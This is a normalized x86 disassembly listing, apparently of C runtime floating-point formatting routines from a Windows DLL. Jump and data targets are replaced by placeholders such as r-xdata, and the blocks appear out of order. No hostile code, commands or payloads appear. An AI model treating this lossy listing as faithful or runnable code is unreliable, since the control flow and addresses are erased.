mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_1001ef2d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_1001a3eb
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_1001a3eb
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_1001a3eb
push [ esi + 0xc0 ]
call sub_1001a3eb
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_10023397
push [ esi + 0xd4 ]
call sub_1001a3eb
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_1001a3eb
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1001a3eb
pop ecx
push [ esi + 0xb0 ]
call sub_1001a3eb
push [ esi + 0xbc ]
call sub_1001a3eb
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1001a3eb
push [ esi + 0xbc ]
call sub_100239e4
pop ecx
pop ecx
push eax
call sub_1001a3eb
pop ecx
push eax
call sub_1001a3eb
push [ esi + 0xbc ]
call sub_1002378b
pop ecx
pop ecx
sub_1001f078
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_1001ee05
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_1001ee94
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_1001ef2d
pop ecx
sub_1001f0c5
push 0xc
push r--data
call sub_10020070
call sub_1001e316
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_10023fbf
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_1001f078
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001f132
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_1001e316
mov esi [ eax + 0x6c ]
mov eax esi
call sub_100200b5
retn
push 0x20
call sub_1001ede7
sub_1001f13e
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_100274f0
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1001bddd
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_1001bddd
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_1002733b
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_100271c8
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_100272e5
pop ecx
test eax eax
jne r-xdata
call sub_1002733b
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_100271c8
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1002729c
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_100269e1
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_1001f2a2
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1001f13e
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_1001f36c
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
or eax 0xffffffff
pop ebp
retn
call sub_1001bddd
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_1001ea75
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_10027790
call sub_1001f2a2
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_1001bddd
mov [ eax ] 0x22
sub_1001f3e3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_100284a2
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_1001b89b
test eax eax
movsx eax [ esi ]
push eax
call sub_100284a2
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1001f457
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_1001f4d9
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_1001f4f5
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_10028576
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_100284ce
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_1001f551
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_1001cbb0
inc eax
push eax
push esi
add esi edi
push esi
call sub_1001a060
add esp 0x10
sub_1001f596
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_1001b46f
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_1001bddd
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_1001bddd
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_1001f551
pop esi
mov [ eax ] esi
call sub_1001ea75
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001ea23
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_1001daf3
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_1001a060
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_1001f6f7
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10028784
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_1001bddd
mov [ eax ] ebx
call sub_1001ea75
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_1001f596
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_1002861e
add esp 0x10
test eax eax
je r-xdata
sub_1001f7be
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001f6f7
add esp 0x18
pop ebp
retn
sub_1001f7de
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_1001b46f
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_1001bddd
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_1001bddd
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_1001ea75
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_1001f7be
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_10028360
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10028900
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10028900
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_1001a9b0
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_10028900
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_10028820
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_10028820
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_10028820
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_1001fb54
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_1001b46f
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
call sub_1001ea75
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_1001cbb0
inc eax
push eax
push esi
push ebx
call sub_1001a060
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_1001cbb0
inc eax
push eax
push esi
push ebx
call sub_1001a060
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_1001f551
push edi
push 0x30
push ebx
call sub_1001a9b0
add esp 0xc
sub_1001fc57
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10028784
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_1001bddd
mov [ eax ] esi
call sub_1001ea75
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_1001bddd
mov [ eax ] esi
call sub_1001ea75
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1001a809
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_1002861e
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_1001fb54
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_1001fd18
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10028784
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_1001bddd
mov [ eax ] edi
call sub_1001ea75
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1001a809
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_1002861e
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1001f596
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_1001fb54
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_1001fe05
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001f6f7
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
